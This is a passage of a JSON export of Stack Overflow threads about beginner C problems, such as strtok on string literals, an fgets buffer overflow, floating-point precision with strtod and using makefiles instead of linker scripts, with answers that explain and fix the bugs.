liteal</em> (<code>\"this is a text\"</code>) and using the same as the input to <code>strtok()</code>.</p>\n\n<p>As <code>strtok()</code> modifies the input string, here, it will invoke invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a>. As mentioned in th <code>C11</code> standard, chapter \u00a76.4.5, <em>String literals</em></p>\n\n<blockquote>\n  <p>[...] If the program attempts to modify such an array, the behavior is\n  undefined.</p>\n</blockquote>\n\n<p>You can either</p>\n\n<ul>\n<li>Define an array and initalize it with the <em>string literal</em> and the use the array as input to <code>strtok()</code>.</li>\n<li>take a pointer, use <code>strdup()</code> to copy the initializer and then supply that pointer to <code>strtok()</code>.</li>\n</ul>\n\n<p>The bottom line is, the input string to <code>strtok()</code> should be modifiable.</p>\n"}, {"tags": [], "owner": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "is_accepted": true, "score": 2, "last_activity_date": 1457615187, "last_edit_date": 1457615187, "creation_date": 1457603228, "answer_id": 35912856, "question_id": 35902376, "link": "https://stackoverflow.com/questions/35902376/srtok-is-not-working-in-c/35912856#35912856", "title": "srtok is not working in c", "body": "<p>While you can't do this with strtok because the literal can't be modified, it can be done with strcspn.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid explode (char *delimiter, char *string);\n\nint main()\n{\n    explode (\" \", \"this is a text\");\n    return 0;\n}\n\nvoid explode (char *delimiter, char *string)\n{\n    int span = 0;\n    int offset = 0;\n    int length = 0;\n\n    if ( delimiter &amp;&amp; string) {\n        length = strlen ( string);\n        printf (\"Splitting string \\\"%s\\\" into tokens:\\n\",string);\n        while (offset &lt; length) {\n            span = strcspn ( &amp;string[offset],delimiter);//work from offset to find next delimiter\n            printf (\"%.*s\\n\",span, &amp;string[offset]);//print span number of characters\n            offset += span + 1;// increment offset by span and one characters\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 167, "user_id": 4574272, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/1411112109189322/picture?type=large", "display_name": "Masum Nishat", "link": "https://stackoverflow.com/users/4574272/masum-nishat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 35912856, "answer_count": 2, "score": 0, "last_activity_date": 1457615187, "creation_date": 1457556832, "last_edit_date": 1457557250, "question_id": 35902376, "link": "https://stackoverflow.com/questions/35902376/srtok-is-not-working-in-c", "title": "srtok is not working in c", "body": "<p>here is my code,</p>\n\n<pre><code>#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nmain ()\n{\n    explode (\" \", \"this is a text\");\n}\n\n    explode (char *delimiter, char string[])\n{\nchar *pch;\nprintf (\"Splitting string \\\"%s\\\" into tokens:\\n\",string);\npch = strtok (string,delimiter);\nwhile (pch != NULL)\n{\n    printf (\"%s\\n\",pch);\n    pch = strtok (NULL, delimiter);\n}\nreturn 0;\n}\n</code></pre>\n\n<p>I compile this code using <code>gcc -o 1.exe 1.c</code> and shows no error. But when i execute <code>1.exe</code> it shows <code>Splitting string \"this is a text\" into tokens:</code> and at that moment <code>1.exe</code> stops working (a dialogue box of windows shows). can anybody tell the problem and solve the problem? I am using windows 10.</p>\n"}, {"tags": ["c", "math"], "comments": [{"owner": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "edited": false, "score": 1, "creation_date": 1457556246, "post_id": 35902157, "comment_id": 59464793, "body": "why don&#39;t you use 2 different arrays for X and Y, say numX and numY ? Also check the scope of the variable num[] when you define it the second time. This 1) hides the outer num[] variable in this scope and 2) is not available for use outside this scope. Perhaps you don&#39;t want that?"}, {"owner": {"reputation": 59, "user_id": 5785747, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204830016063446/picture?type=large", "display_name": "Josh Mulkeen", "link": "https://stackoverflow.com/users/5785747/josh-mulkeen"}, "reply_to_user": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "edited": false, "score": 0, "creation_date": 1457632878, "post_id": 35902157, "comment_id": 59506085, "body": "@s_b thank you for your advice, I have now changed my code to have two separate arrays. However I am a bit confused by what you mean by changing the scope of arrays, I have just read up on them so I&#39;m not very knowledgeable on the matter. I think I need to limit the visibility but I&#39;m unsure"}, {"owner": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "edited": false, "score": 0, "creation_date": 1457643761, "post_id": 35902157, "comment_id": 59512879, "body": "yes, scope and visibility are interchangeable in this case. When I say you need to check the scope of your second array, I am looking at the second float num[] you have defined inside a pair of parenthesis and thinking : &quot;hmm, this will no longer be available when the parenthesis closes; and you haven&#39;t even calculated the gradient yet. &quot; I don&#39;t think this is what you want, do you?"}, {"owner": {"reputation": 59, "user_id": 5785747, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204830016063446/picture?type=large", "display_name": "Josh Mulkeen", "link": "https://stackoverflow.com/users/5785747/josh-mulkeen"}, "reply_to_user": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "edited": false, "score": 0, "creation_date": 1457719352, "post_id": 35902157, "comment_id": 59550410, "body": "@s_b okay I think I have fixed it with my computing lecturer, my only problem now is naming x0 and y0 (the first values from the numx[1000] and numy[1000] array). How would I go about this?"}, {"owner": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "edited": false, "score": 0, "creation_date": 1457832037, "post_id": 35902157, "comment_id": 59585695, "body": "Why do you need to name them ? By they way, they are already &#39;named&#39; as numx[0] and numy[0]. So if you need another name, you can always define new variables and assign numx[0] and numy[0] to them."}], "owner": {"reputation": 59, "user_id": 5785747, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204830016063446/picture?type=large", "display_name": "Josh Mulkeen", "link": "https://stackoverflow.com/users/5785747/josh-mulkeen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1457556663, "creation_date": 1457556111, "question_id": 35902157, "link": "https://stackoverflow.com/questions/35902157/retaining-and-naming-user-inputted-variables-in-c", "title": "Retaining and naming user-inputted variables in C", "body": "<p>I am trying to calculate a gradient using several X and Y values. My problem is that after my code takes the mean of the X and Y values I cannot re-use the user-inputted X and Y values to further calculate a gradient as I don't know how to name them. I've included my code below, and I think I have to use either Arrays or Global variables for this task. </p>\n\n<p>Thank you in advance, my coding knowledge is limited.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\nint n, i;\nfloat num[1000], total=0, mean;\n\nprintf(\"Enter the amount of x-values:\");\nscanf(\"%d\", &amp;n);\nwhile (n &lt;= 0 || n &gt; 1000) {\n    printf(\"Print error. The number should in range of 0 to 1000.\\n\");\n    printf(\"Please try to enter the amount again: \");\n    scanf(\"%d\", &amp;n);\n}\nfor (i = 0; i &lt; n; ++i) {\n    printf(\"%d. Input x-value:\", i+1);\n    scanf(\"%f\", &amp;num[i]);\n    total += num[i];\n}\nmean=total/n;\nprintf(\"The mean of all the x-values entered is %.2f to 2 decimal places\", mean);\n\n{\n    float num[1000], total=0, mean;\n\n    printf(\"Enter the amount of y-values:\");\n    scanf(\"%d\", &amp;n);\n    while (n &lt;= 0 || n &gt; 1000) {\n        printf(\"Print error. The number should in range of 0 to 1000.\\n\");\n        printf(\"Please try to enter the amount again: \");\n        scanf(\"%d\",&amp;n);\n    }\n    for (i = 0; i &lt; n; ++i) {\n        printf(\"%d. Input y-value:\", i+1);\n        scanf(\"%f\", &amp;num[i]);\n        total += num[i];\n    }\n    mean = total / n;\n    printf(\"The mean of all the y-values entered is %.2f to 2 decimal places\", mean);\n\n    return 0;\n}\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "fgets"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1457554726, "post_id": 35901682, "comment_id": 59463872, "body": "The required operation is to generate a segfault?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1457554974, "post_id": 35901682, "comment_id": 59464022, "body": "<code>However the program seems to run correctly.</code>  Wait...what?"}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 1, "last_activity_date": 1457554806, "last_edit_date": 1457554806, "creation_date": 1457554595, "answer_id": 35901705, "question_id": 35901682, "link": "https://stackoverflow.com/questions/35901682/segmentation-fault-core-dumped-c-program-with-arrays/35901705#35901705", "title": "Segmentation Fault (Core Dumped) C Program with Arrays", "body": "<p>In your code,</p>\n\n<pre><code> char sent[] = \"\\0\"; \n</code></pre>\n\n<p>is allocating the size of the array only equal to the size of the supplied initializer <code>\"\\0\"</code> (and null-terminator). So, at a later point, by doing</p>\n\n<pre><code>fgets(sent, SIZE, stdin);\n</code></pre>\n\n<p>you're accessing out of bound memory. This invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a>.</p>\n\n<p>To quote <code>C11</code> standard, chapter \u00a76.7.9</p>\n\n<blockquote>\n  <p>If an array of unknown size is initialized, its size is determined by the largest indexed\n  element with an explicit initializer. [...]</p>\n</blockquote>\n\n<p>What you need is to provide the array size at definition time like</p>\n\n<pre><code> char sent[SIZE] = \"\\0\"; \n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 5442341, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/96d08536d1ca0817af1e87584b754f3c?s=128&d=identicon&r=PG&f=1", "display_name": "bobblehead808", "link": "https://stackoverflow.com/users/5442341/bobblehead808"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2467, "favorite_count": 0, "accepted_answer_id": 35901705, "answer_count": 1, "score": -1, "last_activity_date": 1457555036, "creation_date": 1457554529, "last_edit_date": 1457555036, "question_id": 35901682, "link": "https://stackoverflow.com/questions/35901682/segmentation-fault-core-dumped-c-program-with-arrays", "title": "Segmentation Fault (Core Dumped) C Program with Arrays", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 1000\n\nint main(void)\n{\nchar sent[] = \"\\0\";        \nchar alpha[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz \";\nunsigned int count;\nunsigned int k;\nunsigned int j;                                                            \n\nprintf(\"Please enter a sentence to analyze\\n\");\nfgets(sent, SIZE, stdin);  \n\n\nprintf(\"\\n     Letter\\t ||\\tAmount\\n\");\nprintf(\" ================================\\n\");\n\n    for(j = 0; alpha[j] != '\\0'; j++)\n    {\n        count = 0;\n\n        for (k = 0; sent[k]!= '\\0'; k++)\n        {\n\n            if ( alpha[j] == sent[k])\n            {                          \n                count++;                                   \n            }\n\n        }\n\n        printf(\"\\t%c\\t ||\\t %u\\n\", alpha[j], count);\n        printf(\" --------------------------------\\n\");  \n    }  \n\n\n    return 0;\n\n}\n</code></pre>\n\n<p>Every time I run this program I get the error \"Segmentation Fault (Core Dumped)\". However the program seems to run correctly. Why is this happening and what can I do to fix this? </p>\n"}, {"tags": ["c", "file", "io", "double", "strtod"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457554345, "post_id": 35901628, "comment_id": 59463679, "body": "<a href=\"http://stackoverflow.com/q/605845/2173917\">Please see this discussion on why not to cast the return value of <code>malloc()</code> and family in <code>C</code>.</a>."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457554434, "post_id": 35901628, "comment_id": 59463724, "body": "Looks like <a href=\"http://floating-point-gui.de/\" rel=\"nofollow noreferrer\">float imprecision</a> thing."}], "answers": [{"tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 0, "last_activity_date": 1457555500, "creation_date": 1457555500, "answer_id": 35901956, "question_id": 35901628, "link": "https://stackoverflow.com/questions/35901628/c-strtod-seems-to-add-digits/35901956#35901956", "title": "C - strtod seems to add Digits", "body": "<p>Typically, type <code>double</code> has about 16-17 decimal digits worth of precision.<br/>\nNow, that's not some number of digits past the decimal point -- that's the total number of significant digits, period.  (That's why it's called <em>floating</em> point.)</p>\n\n<p>So it's no coincidence that the number you read in, and the number you printed back out, differ after about the 17th digit:</p>\n\n<pre><code> input: 5241021356985.0302\noutput: 5241021356985.030273\ndigits: 1234567890123 4567890\n                 1          2\n</code></pre>\n"}], "owner": {"reputation": 769, "user_id": 2678718, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/e15f61578762534f8d901ce6a4b39e53?s=128&d=identicon&r=PG&f=1", "display_name": "Sven Bamberger", "link": "https://stackoverflow.com/users/2678718/sven-bamberger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 62, "favorite_count": 0, "closed_date": 1457588595, "answer_count": 1, "score": -1, "last_activity_date": 1457555500, "creation_date": 1457554307, "question_id": 35901628, "link": "https://stackoverflow.com/questions/35901628/c-strtod-seems-to-add-digits", "closed_reason": "Duplicate", "title": "C - strtod seems to add Digits", "body": "<p>I got a Problem with my <code>strtod()</code> it seems to add some digits. I'm reading </p>\n\n<pre><code>2\\t5241021356985.0302\\t9.09\\t825.45\n</code></pre>\n\n<p>from a File And after skipping the integer <code>2</code> I get the following output</p>\n\n<pre><code>output: 5241021356985.030273  9 .090000\n</code></pre>\n\n<p>Here is my Code</p>\n\n<pre><code>char *input_string = (char*) calloc(filesize, sizeof (char*));\nchar *output_string = (char*) calloc(filesize, sizeof (char*));\nchar *input_end;\nfgets(input_string, filesize, infile);\ninput_end = input_string;\nint size_to_read = (int) strtof(input_string, &amp;input_end);\nchar *temp_string=(char*)calloc(70,sizeof(char*)); // max double value\ndouble temp = 0;\n++input_string;\nfor (int i = 0; i &lt; size_to_read; ++i) {\n   temp = strtod(input_string, &amp;input_end);\n   sprintf(temp_string, \"%lf\\t\", temp);\n   strcat(output_string, temp_string);\n   input_string = input_end;\n   ++input_string;\n}\nstrcat(output_string, \"\\0\");\nprintf(\"output: %s\\n\", output_string);\n</code></pre>\n"}, {"tags": ["c", "linux", "gcc"], "comments": [{"owner": {"reputation": 1006, "user_id": 1627585, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/71e0036ad69d81de092d2b1aa528e684?s=128&d=identicon&r=PG", "display_name": "Matthias W.", "link": "https://stackoverflow.com/users/1627585/matthias-w"}, "edited": false, "score": 2, "creation_date": 1457553921, "post_id": 35901509, "comment_id": 59463445, "body": "Maybe you&#39;re rather looking for makefiles?"}, {"owner": {"reputation": 153402, "user_id": 1204143, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/5ca341b160687d99b1317859f91054ee?s=128&d=identicon&r=PG", "display_name": "nneonneo", "link": "https://stackoverflow.com/users/1204143/nneonneo"}, "edited": false, "score": 3, "creation_date": 1457554147, "post_id": 35901509, "comment_id": 59463565, "body": "You definitely don&#39;t want a linker script. A linker script is for when you need to control the layout of your final binary file - which you don&#39;t need to do. You may consider splitting your command line into compile and link stages, which will simplify it slightly, but it won&#39;t ever be totally clean (witness the crazy long command lines generated by many open-source project makefiles)."}], "answers": [{"tags": [], "owner": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "is_accepted": true, "score": 2, "last_activity_date": 1457556457, "creation_date": 1457556457, "answer_id": 35902255, "question_id": 35901509, "link": "https://stackoverflow.com/questions/35901509/basic-linker-script/35902255#35902255", "title": "Basic Linker Script", "body": "<p>In your Makefile:</p>\n\n<pre><code>LDLIBS = -la -lPocoFoundation -lPocoNet -lPocoUtil -lstd++\nLDFLAGS = -L.\n\nall: myapp\n</code></pre>\n\n<p>And then just run make.</p>\n"}, {"tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": false, "score": 1, "last_activity_date": 1457558590, "last_edit_date": 1495539906, "creation_date": 1457558590, "answer_id": 35902890, "question_id": 35901509, "link": "https://stackoverflow.com/questions/35901509/basic-linker-script/35902890#35902890", "title": "Basic Linker Script", "body": "<p>To echo what <a href=\"https://stackoverflow.com/users/1204143/nneonneo\">nneonneo</a> said in a comment:</p>\n\n<p>A linker script will not do what you want here. Linker scripts are used to configure how the linker generates output, e.g. where different types of code and data are located in memory. There is almost never any reason to write or customize a linker script outside of embedded/low-level software development.</p>\n\n<p>What you want is a Makefile, as explained by jforberg.</p>\n"}], "owner": {"reputation": 3, "user_id": 6030829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db2d0375f301d26d08d5c6e9805abc84?s=128&d=identicon&r=PG&f=1", "display_name": "programer8472", "link": "https://stackoverflow.com/users/6030829/programer8472"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 1, "accepted_answer_id": 35902255, "answer_count": 2, "score": 0, "last_activity_date": 1457558590, "creation_date": 1457553811, "question_id": 35901509, "link": "https://stackoverflow.com/questions/35901509/basic-linker-script", "title": "Basic Linker Script", "body": "<p>I'm trying to clean up the commandline required to build my program. Right now, the command in my makefile looks like this.</p>\n\n<p>gcc -o myapp myapp.c liba.a -lPocoFoundation -lPocoNet -lPocoUtil -lstdc++</p>\n\n<p>And I have other shared libraries to add to it!</p>\n\n<p>I believe a linker script would clean things up nicely. However, all the examples I've seen of linker scripts talk about memory management, requiring values which I do not know how to set.</p>\n\n<p>If you would write a very basic linker script that included the libraries noted above, I would be most grateful!</p>\n\n<p>Thank you so much in advance for your time.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 4, "creation_date": 1457552850, "post_id": 35901206, "comment_id": 59462802, "body": "Cannot say that I have seen <code>char *argv[argc+1])</code> - Any reference"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1457553058, "post_id": 35901206, "comment_id": 59462924, "body": "It means nothing, since the compiler will ignore it."}, {"owner": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "edited": false, "score": 0, "creation_date": 1457553061, "post_id": 35901206, "comment_id": 59462926, "body": "I found it. It was on Hacker News - <a href=\"https://news.ycombinator.com/item?id=9019085\" rel=\"nofollow noreferrer\">news.ycombinator.com/item?id=9019085</a> . &quot; This allegedly helps prevent null pointers from being passed in, and presumably tells the analyzers and optimizers some things they should know.&quot;"}, {"owner": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1457553119, "post_id": 35901206, "comment_id": 59462956, "body": "@kaylum it looks like that&#39;s probably a duplicate."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1457553487, "post_id": 35901206, "comment_id": 59463166, "body": "<i>&quot;This allegedly helps prevent null pointers from being passed in&quot;</i> On the contrary, the C spec guarantees that <code>argv[argc]</code> <i>is</i> a NULL pointer. So if the compiler somehow enforced a non-NULL rule (which is doesn&#39;t), then that definition of <code>main</code> would be invalid."}, {"owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1457554823, "post_id": 35901206, "comment_id": 59463922, "body": "as the dupe describes (briefly) if the array syntax is used for a function parameter <b>with keyword <code>static</code></b> (only C99 or later) which this Q doesn&#39;t, it tells the compiler/etc the adjusted parameter must point to at least that many elements and thus must be nonnull; it does not require anything about the element values, here the pointers <i>in</i> <code>argv[i]</code>. As @user3386109 indicates the standard elsewhere requires <code>argv[0 to argc]</code> <i>in initial call to 2arg <code>main</code></i> exist and <code>[argc]</code> be a null pointer and <code>[0..argc-1]</code> point to string values (necessarily nonnull)."}], "answers": [{"comments": [{"owner": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "edited": false, "score": 0, "creation_date": 1457553356, "post_id": 35901342, "comment_id": 59463089, "body": "Ah, thanks! Unfortunately since a bunch of others (and myself) marked this as a duplicate my question already had an answer :P Thank you though"}], "tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": true, "score": 1, "last_activity_date": 1457553465, "last_edit_date": 1457553465, "creation_date": 1457553278, "answer_id": 35901342, "question_id": 35901206, "link": "https://stackoverflow.com/questions/35901206/values-in-between-brackets-in-function-definitions/35901342#35901342", "title": "Values in between brackets in function definitions", "body": "<p>On the one hand, this is not allowed in \"classic\" C (C89/90), since array size expression is not constant. It became legal in C99.</p>\n\n<p>One the other hand, even in C99 the top-level array size in function parameter declaration is still ignored and the declaration is equivalent to</p>\n\n<pre><code>int main (int argc, char **argv) \n</code></pre>\n\n<p>So, the only reason for that <code>argc+1</code> to be there is to serve as a self-documentation feature: it tells the reader that <code>argv</code> pointer points to the beginning of an array with <code>argc + 1</code> valid elements.</p>\n"}], "owner": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "closed_date": 1457553277, "accepted_answer_id": 35901342, "answer_count": 1, "score": 1, "last_activity_date": 1457553465, "creation_date": 1457552776, "last_edit_date": 1457552977, "question_id": 35901206, "link": "https://stackoverflow.com/questions/35901206/values-in-between-brackets-in-function-definitions", "closed_reason": "Duplicate", "title": "Values in between brackets in function definitions", "body": "<p>I've seen people do stuff like this before in C - </p>\n\n<pre><code>int main (int argc, char *argv[argc+1])\n{\n    /* ... */\n}\n</code></pre>\n\n<p>What is the significance of the <code>argc+1</code> and what does it mean? Does it help prevent invalid pointers or what?</p>\n"}, {"tags": ["c", "arrays", "pointers", "srand"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457552778, "post_id": 35901172, "comment_id": 59462744, "body": "<a href=\"http://stackoverflow.com/q/605845/2173917\">Please see this discussion on why not to cast the return value of <code>malloc()</code> and family in <code>C</code>.</a>."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457552816, "post_id": 35901172, "comment_id": 59462774, "body": "Move <code>char* randomstring(int);</code> at the beginning...."}, {"owner": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "edited": false, "score": 3, "creation_date": 1457552845, "post_id": 35901172, "comment_id": 59462799, "body": "From now on, please properly indent your code or else no one will be able to read it."}, {"owner": {"reputation": 9494, "user_id": 5517378, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/VWdPz.png?s=128&g=1", "display_name": "NutCracker", "link": "https://stackoverflow.com/users/5517378/nutcracker"}, "edited": false, "score": 0, "creation_date": 1457552852, "post_id": 35901172, "comment_id": 59462803, "body": "You should put srand((unsigned) time (NULL)) inside your function"}, {"owner": {"reputation": 172529, "user_id": 140750, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/4c7af12cad08c95bc206a9636d164224?s=128&d=identicon&r=PG", "display_name": "William Pursell", "link": "https://stackoverflow.com/users/140750/william-pursell"}, "reply_to_user": {"reputation": 726, "user_id": 5699135, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ELexL.png?s=128&g=1", "display_name": "birdoftheday", "link": "https://stackoverflow.com/users/5699135/birdoftheday"}, "edited": false, "score": 1, "creation_date": 1457552875, "post_id": 35901172, "comment_id": 59462819, "body": "@stanpines s/able/willing/"}, {"owner": {"reputation": 8390, "user_id": 1404049, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/vkpuK.png?s=128&g=1", "display_name": "Fallenreaper", "link": "https://stackoverflow.com/users/1404049/fallenreaper"}, "edited": false, "score": 0, "creation_date": 1457553045, "post_id": 35901172, "comment_id": 59462919, "body": "Do you mean clear as in using <code>free</code> or do you mean clear as in reset it to a default value?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1457553160, "post_id": 35901172, "comment_id": 59462986, "body": "Your log statements <i>are</i> confusing."}], "answers": [{"tags": [], "owner": {"reputation": 127623, 